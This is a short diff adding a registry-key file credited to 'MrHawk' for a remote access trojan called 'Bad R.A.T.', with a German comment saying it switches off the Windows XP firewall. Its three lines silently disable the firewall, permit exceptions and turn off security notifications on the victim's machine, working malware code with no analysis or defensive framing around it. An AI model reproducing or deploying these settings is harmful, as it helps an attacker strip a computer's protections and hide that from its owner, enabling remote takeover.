@@ -1,0 +1,8 @@
+;Reg Keys for [Bad R.A.T.]
+;by MrHawk
+;THX to heroin
+
+; Schaltet WinXP FW aus
+RegAdd HKEY_LOCAL_MACHINE,SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile,EnableFirewall,0
+RegAdd HKEY_LOCAL_MACHINE,SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile,DoNotAllowExceptions,0
+RegAdd HKEY_LOCAL_MACHINE,SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile,DisableNotifications,1
